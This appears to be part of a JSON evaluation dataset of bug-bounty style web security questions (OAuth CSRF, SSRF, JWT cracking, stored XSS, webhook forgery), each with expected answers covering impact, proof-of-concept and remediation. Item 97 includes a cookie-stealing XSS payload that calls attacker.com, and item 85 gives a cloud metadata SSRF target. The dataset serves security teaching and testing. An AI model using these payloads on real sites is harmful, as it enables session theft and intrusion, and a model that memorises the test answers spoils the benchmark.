+    "expected_answer": "This is a CSRF vulnerability in the OAuth authentication flow where the missing state parameter validation allows an attacker to force a victim to authenticate with the attacker's OAuth account, linking it to the victim's session. Without state parameter validation, an attacker can initiate an OAuth flow, capture the authorization callback URL containing their authorization code, and trick the victim into visiting this URL, causing the victim's account to be linked to the attacker's OAuth identity. The real-world impact includes account linking attacks where the attacker gains persistent access to the victim's account through their own OAuth credentials, session fixation where the victim unknowingly operates under the attacker's identity, and login CSRF where the victim's actions (purchases, data entry) are performed in the attacker's account context. A proof-of-concept involves initiating the OAuth flow, pausing at the callback step to capture the authorization code URL, crafting a page that redirects the victim to this callback URL (e.g., <img src=\"https://app.com/auth/callback?code=ATTACKER_CODE\">), and demonstrating that the victim's session becomes linked to the attacker's OAuth account. Remediation requires generating a cryptographically random state parameter bound to the user's session, validating the state parameter on every OAuth callback by comparing it against the session-stored value, implementing PKCE (Proof Key for Code Exchange) for additional protection, and rejecting any OAuth callback that lacks or has a mismatched state value.",
+    "reasoning_requirement": "Understand state parameter purpose.",
+    "evaluation_criteria": "Mentions session binding importance.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 83,
+    "scenario": "Admin password reset does not require MFA confirmation.",
+    "prompt": "What impact should be analyzed?",
+    "expected_answer": "This is a privilege escalation vulnerability bypassing multi-factor authentication, where an attacker who compromises an admin's session or password can reset the password without being challenged by the MFA second factor, effectively bypassing the additional security layer entirely. The gap in MFA enforcement on the password reset flow means that MFA only protects the login step but not the most critical account modification, creating an inconsistent security boundary. The real-world impact is complete administrative account takeover with full system control, even when MFA is enabled, since the attacker can change the admin password and set up their own MFA on the account, permanently locking out the legitimate administrator. A proof-of-concept involves obtaining temporary admin session access (through XSS, session hijacking, or phishing), navigating to the password reset functionality, completing the password change without encountering any MFA challenge, and demonstrating that the admin's MFA is effectively bypassed for this critical operation. Remediation requires implementing step-up authentication that challenges for MFA on all sensitive operations (password changes, email changes, role modifications, API key generation), applying MFA consistently across all critical account management functions, implementing separate MFA validation for high-privilege operations even within an authenticated session, sending immediate notifications of password changes to alternative admin contacts, and requiring multiple administrator approval for admin password resets.",
+    "reasoning_requirement": "Recognize missing step-up authentication.",
+    "evaluation_criteria": "Mentions bypass of second factor.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 84,
+    "scenario": "Application stores password hashes using unsalted MD5.",
+    "prompt": "What risk exists?",
+    "expected_answer": "This creates a rapid offline password cracking vulnerability where unsalted MD5 hashes can be reversed using precomputed rainbow tables in seconds and brute-forced at rates exceeding 10 billion hashes per second on modern GPUs. Without salting, identical passwords produce identical hashes, allowing attackers to crack all instances simultaneously and leverage precomputed lookup tables covering common passwords and dictionary words. The real-world impact is that any database breach immediately compromises the majority of user passwords, as MD5 provides essentially no protection against modern cracking hardware, and the lack of salting means the entire password database can be processed as a batch using rainbow tables. A proof-of-concept involves demonstrating that the stored hash matches known MD5 outputs for common passwords (e.g., MD5 of 'password123' is '482c811da5d5b4bc6d497ffa98491e38'), using online MD5 lookup databases to reverse hashes instantly, and benchmarking hashcat to show that the full keyspace of 8-character passwords can be exhausted in hours. Remediation requires immediately migrating to a modern adaptive hashing algorithm like bcrypt, scrypt, or Argon2id with appropriate cost factors, implementing unique per-user salts of at least 128 bits, forcing a password reset for all users during migration, implementing the new hashing transparently by rehashing on next login, and establishing regular reviews of password storage security against current best practices.",
+    "reasoning_requirement": "Recognize weak hashing algorithm.",
+    "evaluation_criteria": "Mentions rainbow table vulnerability.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 85,
+    "scenario": "API accepts user-supplied URL to fetch profile picture.",
+    "prompt": "What vulnerability should be tested?",
+    "expected_answer": "This is a Server-Side Request Forgery (SSRF) vulnerability where the application makes HTTP requests to user-supplied URLs from the server side, allowing an attacker to probe internal network resources, access cloud metadata services, and interact with internal services that are not exposed to the internet. By supplying URLs pointing to internal addresses (http://127.0.0.1, http://169.254.169.254, http://internal-service:8080), the attacker forces the server to make requests to these targets with the server's network privileges and credentials. The real-world impact includes theft of cloud IAM credentials from metadata services, port scanning and service discovery of internal infrastructure, accessing internal admin panels and databases, reading local files through file:// protocol handlers, and potentially achieving remote code execution through internal service exploitation. A proof-of-concept involves submitting a profile picture URL pointing to http://169.254.169.254/latest/meta-data/ (AWS metadata) or an attacker-controlled server with a listener, observing the server's request in the callback or the returned content for internal data leakage. Remediation requires implementing strict URL validation with a whitelist of allowed domains, blocking all private IP ranges (RFC 1918) and link-local addresses, disabling unnecessary protocol handlers (file://, gopher://, dict://), using a dedicated egress proxy with restricted network access for URL fetching, and implementing DNS resolution validation to prevent DNS rebinding attacks.",
+    "reasoning_requirement": "Recognize server-side URL fetch risk.",
+    "evaluation_criteria": "Mentions internal resource probing.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 86,
+    "scenario": "A login endpoint returns distinct timing differences for valid users.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is a timing-based user enumeration vulnerability (side-channel attack) where measurable response time differences between valid and invalid usernames allow an attacker to determine which accounts exist in the system. The timing discrepancy typically occurs because the server performs expensive operations (password hashing, database lookups) only for valid usernames, creating a measurable delay compared to the fast rejection of non-existent usernames. The real-world impact includes building a verified list of valid user accounts for targeted credential stuffing, phishing campaigns, and social engineering attacks, with the added stealth advantage that timing-based enumeration is harder to detect than response-message-based enumeration. A proof-of-concept involves sending authentication requests with known-valid and known-invalid usernames, measuring response times over multiple iterations to establish statistical significance, and demonstrating a consistent timing difference (often 50-200ms) that reliably distinguishes valid from invalid accounts using tools like Burp Suite's response time analysis. Remediation requires implementing constant-time comparison functions for authentication, performing the same computational work (including password hashing) for both valid and invalid usernames, adding random jitter to response times, using generic error messages that do not distinguish between username and password failures, and implementing rate limiting on authentication endpoints to make timing analysis impractical at scale.",
+    "reasoning_requirement": "Recognize side-channel timing attack.",
+    "evaluation_criteria": "Mentions measurable response delay.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 87,
+    "scenario": "Application allows unlimited file size uploads.",
+    "prompt": "What vulnerability should be evaluated?",
+    "expected_answer": "This is a denial of service vulnerability through resource exhaustion where the absence of file size limits on uploads allows an attacker to consume all available disk space, memory, or bandwidth, rendering the application or its entire hosting environment unavailable. An attacker can upload extremely large files (gigabytes) repeatedly to fill server disk partitions, exhaust upload processing memory buffers, saturate network bandwidth, and potentially affect other applications sharing the same infrastructure. The real-world impact includes complete service outage when disk space is exhausted, application crashes from out-of-memory conditions during large file processing, degraded performance for all users during bandwidth-saturating uploads, and potential cascading failures affecting databases and logging when disk space runs out. A proof-of-concept involves using curl or a custom script to upload progressively larger files (100MB, 1GB, 10GB) to the endpoint, monitoring server resource utilization (disk space, memory, CPU), and documenting the point at which the upload causes service degradation or failure. Remediation requires implementing maximum file size limits at multiple layers (web server, application, and reverse proxy), using streaming upload processing that does not buffer entire files in memory, implementing per-user upload quotas and rate limits, adding disk space monitoring with alerts, implementing automatic cleanup of temporary upload files, and configuring web server timeouts that abort excessively long uploads.",
+    "reasoning_requirement": "Recognize storage or memory abuse risk.",
+    "evaluation_criteria": "Mentions upload size limits.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 88,
+    "scenario": "JWT secret is guessable due to short key length.",
+    "prompt": "What attack should be tested?",
+    "expected_answer": "This is a JWT signature brute force vulnerability where a weak or short symmetric signing key (used with HS256/HS384/HS512) can be cracked offline, allowing an attacker to forge arbitrary JWT tokens with any claims they desire. Using tools like hashcat or jwt-cracker, an attacker can brute-force or dictionary-attack the JWT secret key against a captured token, and once the key is discovered, forge tokens with admin privileges, modified user IDs, or extended expiration times. The real-world impact is complete authentication bypass, as knowledge of the signing secret allows creating valid JWTs for any user, any role, and any expiration, effectively granting unlimited access to the entire application without any credentials. A proof-of-concept involves capturing a valid JWT, using hashcat with mode 16500 (JWT) or jwt-cracker to attempt common passwords and short key values against the token, and upon discovering the secret, forging a new token with admin claims using PyJWT or jwt.io and demonstrating successful authenticated access. Remediation requires using cryptographically random secrets of at least 256 bits for HMAC-based JWT algorithms, migrating to asymmetric algorithms (RS256/ES256) where the private key is never exposed, implementing key rotation policies, storing JWT secrets in secure key management systems (HashiCorp Vault, AWS KMS), and monitoring for anomalous JWT usage patterns that might indicate key compromise.",
+    "reasoning_requirement": "Recognize weak symmetric key vulnerability.",
+    "evaluation_criteria": "Mentions offline cracking feasibility.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 89,
+    "scenario": "API endpoint allows deletion of any resource by ID without ownership check.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is an IDOR vulnerability leading to destructive unauthorized actions where any authenticated user can delete resources belonging to other users by simply specifying different resource IDs in the delete request without ownership verification. The missing authorization check means the API only validates that the user is authenticated but does not verify they own or have permission to delete the targeted resource. The real-world impact includes mass data destruction across the platform, targeted deletion of competitors' content or listings, sabotage of business-critical records, and potential regulatory violations from unauthorized destruction of data subject to retention requirements. A proof-of-concept involves creating a test resource, noting its ID, then authenticating as a different user and sending a DELETE request for the first user's resource ID, verifying the deletion succeeds and the resource is removed from the original owner's account. Remediation requires implementing object-level authorization checks that verify the authenticated user owns or has explicit delete permission on the target resource before processing, using access control policies that enforce ownership validation at the data layer, adding soft-delete mechanisms with admin recovery capabilities, implementing audit logging for all delete operations, and adding confirmation requirements for bulk or sensitive deletion operations.",
+    "reasoning_requirement": "Recognize missing authorization validation.",
+    "evaluation_criteria": "Mentions data integrity impact.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 90,
+    "scenario": "An app uses predictable temporary file names during export.",
+    "prompt": "What vulnerability should be tested?",
+    "expected_answer": "This is a race condition file access vulnerability where predictable temporary file names during the export process allow an attacker to access another user's export data by requesting the predictable file URL during the brief window between file creation and cleanup. If temporary files follow patterns like /tmp/export_[timestamp].csv or /tmp/export_[user_id].csv, an attacker can predict the filename and access it before it is deleted, exposing the exported data. The real-world impact includes unauthorized access to exported data containing sensitive information like user lists, financial reports, or business analytics, with the timing window being exploitable through automated polling or by deliberately slowing down the victim's export process. A proof-of-concept involves triggering an export operation, observing the temporary file naming pattern, then simultaneously triggering another user's export and polling for the predicted filename during the processing window, demonstrating access to the other user's export data. Remediation requires using cryptographically random temporary filenames that cannot be predicted, storing temporary files in per-user or per-session isolated directories with strict permissions, implementing direct-to-memory streaming export that avoids temporary files entirely, setting restrictive file permissions (600) on creation, implementing immediate cleanup after the export stream completes, and serving exports through authenticated download endpoints rather than static file URLs.",
+    "reasoning_requirement": "Recognize temporary file exposure risk.",
+    "evaluation_criteria": "Mentions file access before deletion.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 91,
+    "scenario": "Application trusts client-provided discount percentage.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is a business logic manipulation vulnerability where the server trusts client-supplied discount values without server-side validation, allowing an attacker to apply arbitrary discount percentages including 100% (free) or even negative values (which might credit their account) to any purchase. By intercepting the checkout request and modifying the discount parameter from the intended value to any percentage they choose, an attacker can purchase goods at significantly reduced prices or for free. The real-world impact is direct revenue loss for the business, as attackers can systematically purchase products at manipulated prices, potentially at scale through automation, and may also use negative discounts to inflate account balances or credits. A proof-of-concept involves adding items to a cart, proceeding to checkout, intercepting the request in Burp Suite, modifying the discount percentage field (e.g., changing from 10% to 99% or 100%), submitting the modified request, and verifying the order completes at the manipulated discounted price. Remediation requires validating all discounts server-side against the authoritative discount database, never accepting discount values from client input, implementing discount validation through coupon codes verified server-side, recalculating all pricing on the server using trusted data sources, implementing anomaly detection for unusual discount patterns, and adding financial reconciliation checks that flag transactions with unexpected discount amounts.",
+    "reasoning_requirement": "Recognize pricing validation absence.",
+    "evaluation_criteria": "Mentions server-side enforcement need.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 92,
+    "scenario": "Admin endpoints rely on IP allowlist only.",
+    "prompt": "What bypass should be evaluated?",
+    "expected_answer": "This is a network trust bypass vulnerability where IP-only access control for admin endpoints can be circumvented through IP spoofing via trusted headers, SSRF exploitation from within the trusted network, or compromising any system within the allowlisted IP range. Attackers can manipulate X-Forwarded-For or X-Real-IP headers if the application trusts proxy-supplied client IPs, or leverage an SSRF vulnerability in any internet-facing service to make requests from the internal network that matches the allowlist. The real-world impact is full administrative access to the application, bypassing what appears to be a strong access control mechanism, enabling user management, data export, system configuration changes, and potentially remote code execution through admin functionality. A proof-of-concept involves testing X-Forwarded-For header injection with the allowlisted IP address, identifying any SSRF vulnerability that can be used to proxy requests through the trusted network, or exploiting any compromise of systems within the allowlisted IP range to demonstrate admin access from an unauthorized source. Remediation requires implementing defense-in-depth with multiple authentication layers beyond IP validation, adding proper authentication and authorization (credentials + MFA) on all admin endpoints regardless of source IP, configuring the application to ignore X-Forwarded-For from untrusted sources, implementing VPN or zero-trust network access for admin functions, and adding behavioral monitoring for admin endpoint access patterns.",
+    "reasoning_requirement": "Recognize network-based trust weakness.",
+    "evaluation_criteria": "Mentions internal pivot potential.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 93,
+    "scenario": "A reset password endpoint leaks token via referer header.",
+    "prompt": "What risk exists?",
+    "expected_answer": "This is a token leakage vulnerability through the HTTP Referer header, where the password reset token included in the URL is sent to third-party domains when the user clicks any external link on the reset page, or when the page loads resources (images, scripts, analytics) from external domains. The Referer header automatically includes the full URL of the referring page, which in this case contains the sensitive reset token, exposing it to every third-party service whose resources are loaded on the password reset page. The real-world impact is account takeover, as third-party analytics services, advertising networks, CDN providers, or any externally-loaded resource can capture the reset token from their server logs, and compromised or malicious third parties can use these tokens to reset user passwords. A proof-of-concept involves loading the password reset page while monitoring outgoing requests in browser DevTools, examining the Referer header on requests to third-party domains, and demonstrating that the full URL including the reset token is transmitted to external services. Remediation requires implementing the Referrer-Policy header set to 'no-referrer' or 'same-origin' on password reset pages, sending reset tokens via POST request body instead of URL parameters, adding the rel='noreferrer' attribute to all external links on reset pages, avoiding loading any third-party resources on security-sensitive pages, and using short-lived tokens that expire quickly to minimize the exploitation window.",
+    "reasoning_requirement": "Recognize referer-based data exposure.",
+    "evaluation_criteria": "Mentions external site capture risk.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 94,
+    "scenario": "Application uses old OAuth implicit flow for SPA.",
+    "prompt": "What vulnerability risk exists?",
+    "expected_answer": "This creates a token exposure vulnerability through the OAuth implicit flow, where the access token is returned directly in the URL fragment (#access_token=...) of the redirect URI, making it visible in browser history, server logs, referer headers, and potentially to malicious JavaScript on the page. The implicit flow was deprecated by OAuth 2.1 specifically because the access token transmission through URL fragments creates multiple interception points, and SPAs now have a secure alternative through the Authorization Code flow with PKCE. The real-world impact includes access token theft through browser history access, shoulder surfing, referrer leakage to third-party scripts, and browser extensions with URL access permissions, all leading to account takeover since the token provides immediate API access. A proof-of-concept involves completing the OAuth implicit flow, then demonstrating the access token is visible in the browser's address bar, stored in browser history (accessible via back button or history API), and transmitted in the Referer header if the page loads external resources. Remediation requires migrating to the Authorization Code flow with PKCE (Proof Key for Code Exchange) as recommended by OAuth 2.1, implementing a Backend-for-Frontend (BFF) pattern where tokens are exchanged and stored server-side, using short-lived access tokens with refresh token rotation, and disabling the implicit flow grant type in the OAuth provider configuration.",
+    "reasoning_requirement": "Recognize implicit flow weaknesses.",
+    "evaluation_criteria": "Mentions access token in URL fragment.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 95,
+    "scenario": "A system does not validate content type before processing uploads.",
+    "prompt": "What vulnerability should be tested?",
+    "expected_answer": "This is a content-type spoofing vulnerability that can lead to remote code execution (RCE) when the server processes uploaded files based on the client-declared Content-Type or file extension without validating the actual file contents using magic byte analysis. An attacker can upload an executable file (PHP, JSP, ASPX, Python) with a spoofed Content-Type header claiming it is an image or document, and if the server routes file processing based on the declared type, the file may be stored and served in a way that enables execution. The real-world impact includes webshell deployment for persistent server access, arbitrary command execution through uploaded scripts, server compromise leading to data exfiltration and lateral movement, and potential infrastructure-wide compromise if the server has access to internal resources. A proof-of-concept involves crafting a PHP webshell file, setting the Content-Type to image/jpeg in the upload request, uploading through the endpoint, then accessing the uploaded file URL and testing for code execution by appending command parameters. Remediation requires implementing server-side content type validation using magic bytes (file signatures) rather than relying on client-declared Content-Type headers or extensions, storing uploads outside the webroot, serving uploaded files through a proxy that prevents execution, randomizing filenames, implementing antivirus scanning on uploads, and using a content-type whitelist based on business requirements.",
+    "reasoning_requirement": "Recognize server-side parsing trust issue.",
+    "evaluation_criteria": "Mentions MIME validation necessity.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 96,
+    "scenario": "Password reset endpoint lacks CAPTCHA or throttling.",
+    "prompt": "What attack should be evaluated?",
+    "expected_answer": "This enables automated brute force attacks against the password reset mechanism, including mass password reset token guessing, credential stuffing through the reset flow, and denial of service through mass reset email generation flooding users' inboxes. Without CAPTCHA or throttling, an attacker can submit thousands of reset requests per second to enumerate valid accounts, brute-force reset tokens, and overwhelm email infrastructure with password reset notifications. The real-world impact includes successful brute force of weak reset tokens, user harassment through email flooding with reset notifications, email infrastructure overload that may affect all application emails, account enumeration through response analysis at high speed, and potential email provider reputation damage from mass automated emails. A proof-of-concept involves scripting rapid password reset requests for the same or different email addresses using Burp Intruder or a custom tool, demonstrating that no rate limiting or CAPTCHA challenge blocks the automated requests, measuring the maximum achievable request rate, and documenting the impact on the target email inbox. Remediation requires implementing progressive CAPTCHA challenges after the first few attempts, adding rate limiting per IP address and per target email, implementing exponential backoff delays between reset requests for the same account, limiting the number of active reset tokens per account, using token bucket or sliding window rate limiting algorithms, and implementing email sending throttling to prevent inbox flooding.",
+    "reasoning_requirement": "Recognize lack of abuse protection.",
+    "evaluation_criteria": "Mentions automation feasibility.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 97,
+    "scenario": "A web app allows HTML in profile bio field.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is a Stored Cross-Site Scripting (XSS) vulnerability where HTML content entered in the profile bio field is persisted in the database and rendered without sanitization to every user who views the profile, enabling persistent malicious code execution. An attacker can inject JavaScript-capable HTML like <img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)> or <svg onload=alert(document.domain)> in their bio, and the payload executes in every visitor's browser session. The real-world impact is widespread account compromise, as every user who views the attacker's profile (or any page displaying the bio snippet, like user listings or comment sections) will have the malicious script execute in their authenticated session, enabling mass session hijacking, credential theft, and worm-like propagation. A proof-of-concept involves entering a JavaScript payload in the bio field using event handlers like <img onerror=alert(1) src=x>, saving the profile, visiting the profile page in another authenticated session, and demonstrating that the script executes and can access the viewer's cookies and session data. Remediation requires implementing server-side HTML sanitization using an allowlist-based library (DOMPurify, Bleach) that strips all script elements and event handlers, applying context-aware output encoding when rendering bio content, deploying Content Security Policy headers that prevent inline script execution, using a markdown-only input format that is rendered safely, and implementing content validation that rejects submissions containing HTML tags or JavaScript patterns.",
+    "reasoning_requirement": "Recognize unescaped HTML rendering.",
+    "evaluation_criteria": "Mentions persistent script injection.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 98,
+    "scenario": "An API reveals internal IP addresses in response headers.",
+    "prompt": "What risk should be analyzed?",
+    "expected_answer": "This is an information disclosure vulnerability where internal IP addresses leaked through HTTP response headers (X-Powered-By, X-Backend-Server, Via, X-Forwarded-For, or custom debug headers) reveal the application's internal network topology, enabling targeted attacks against specific infrastructure components. Knowledge of internal IP addressing helps attackers identify subnet layouts, the number of backend servers, load balancing architecture, and potential SSRF targets within the internal network. The real-world impact includes accelerated reconnaissance for SSRF exploitation by providing exact internal targets, identification of infrastructure patterns that reveal cloud provider and deployment architecture, enabling targeted attacks against specific servers if combined with other vulnerabilities, and providing network topology information useful for lateral movement planning. A proof-of-concept involves sending requests to all API endpoints and examining response headers for internal IP patterns (10.x.x.x, 172.16-31.x.x, 192.168.x.x), documenting the discovered internal addresses and their associated endpoints, and mapping the inferred internal network topology. Remediation requires configuring reverse proxies and load balancers to strip all internal headers before sending responses to clients, removing debug and server identification headers in production, implementing a standardized header sanitization policy at the edge/CDN layer, auditing all custom response headers for information leakage, and configuring web frameworks to suppress server identification headers in production mode.",
+    "reasoning_requirement": "Recognize infrastructure leakage.",
+    "evaluation_criteria": "Mentions internal topology exposure.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 99,
+    "scenario": "A file conversion API allows uploading arbitrary file types for processing.",
+    "prompt": "What vulnerability chain should be evaluated?",
+    "expected_answer": "This is a Remote Code Execution (RCE) vulnerability through malicious file parsing, where the file conversion engine (such as ImageMagick, LibreOffice, FFmpeg, or Ghostscript) processes attacker-supplied files that exploit parser vulnerabilities to execute arbitrary system commands. File processing libraries have a long history of critical vulnerabilities (e.g., ImageMagick's ImageTragick CVE-2016-3714) where specially crafted input files trigger command injection, buffer overflows, or server-side request forgery through the parser's functionality. The real-world impact is full server compromise through remote code execution, as a single malicious file upload can give the attacker shell access, enabling data exfiltration, cryptocurrency mining, ransomware deployment, and lateral movement to connected systems. A proof-of-concept involves identifying the file processing library through error messages or response headers, crafting a file that exploits known vulnerabilities in that library (e.g., an SVG with embedded code for ImageMagick, or a malicious ODT for LibreOffice), uploading it through the conversion endpoint, and demonstrating command execution through DNS callbacks or response content. Remediation requires running file processing in isolated sandboxes (containers or VMs) with no network access, keeping all file processing libraries updated to the latest patched versions, implementing strict file type validation using magic bytes, disabling dangerous features in processing libraries (e.g., ImageMagick's policy.xml), applying resource limits on conversion processes, and implementing a whitelist of allowed input and output formats.",
+    "reasoning_requirement": "Recognize parser exploitation risk.",
+    "evaluation_criteria": "Mentions file processing engine vulnerabilities.",
+    "category": "bounty_patterns"
+  },
+  {
+    "id": 100,
+    "scenario": "A payment webhook processes events without verifying source signature.",
+    "prompt": "What vulnerability applies?",
+    "expected_answer": "This is a webhook forgery vulnerability leading to direct financial manipulation, where the payment webhook endpoint processes events like payment_intent.succeeded or charge.completed without verifying the cryptographic signature that proves the event was genuinely sent by the payment provider (Stripe, PayPal, etc.). An attacker who discovers the webhook URL can send fabricated payment confirmation events, causing the application to fulfill orders, credit accounts, or provision services without any actual payment being made. The real-world impact is direct financial fraud at scale, as an attacker can forge payment success notifications to receive goods and services for free, credit virtual wallets without paying, upgrade subscriptions without charges, and manipulate financial records, potentially causing massive revenue loss before detection. A proof-of-concept involves identifying the webhook endpoint URL through documentation, JavaScript source, or traffic analysis, crafting a JSON payload that mimics a successful payment event from the provider's webhook format, sending it to the endpoint via curl, and verifying the application processes the fraudulent event by checking for order fulfillment, account credits, or subscription upgrades. Remediation requires implementing webhook signature verification using the payment provider's SDK and signing secret, validating event timestamps to prevent replay attacks within a narrow window, verifying events by making a server-to-server callback to the payment provider's API to confirm the event is real, implementing IP allowlisting for known payment provider webhook sources, and adding financial reconciliation processes that compare webhook events against actual payment records.",
+    "reasoning_requirement": "Recognize missing authenticity verification.",
+    "evaluation_criteria": "Mentions forged payment confirmation risk.",
+    "category": "bounty_patterns"
+  }
+]
